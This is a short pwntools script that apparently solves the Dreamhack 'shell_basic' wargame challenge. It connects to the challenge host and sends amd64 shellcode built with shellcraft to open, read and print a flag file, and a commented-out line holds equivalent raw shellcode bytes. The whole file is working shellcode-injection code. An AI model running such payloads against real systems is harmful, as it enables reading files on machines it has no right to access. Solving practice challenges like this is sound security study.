from pwn import *

p = remote("host3.dreamhack.games", 20534)
# shellcode = b"\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\xbf\x01\x00\x00\x00\x48\x89\xe6\xba\x28\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05"

context.arch = "amd64"

path = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(path)
shellcode += shellcraft.read("rax", "rsp", 0x30)
shellcode += shellcraft.write(1, "rsp", 0x30)
shellcode = asm(shellcode)

p.sendlineafter("shellcode: ", shellcode)
print(p.recv())
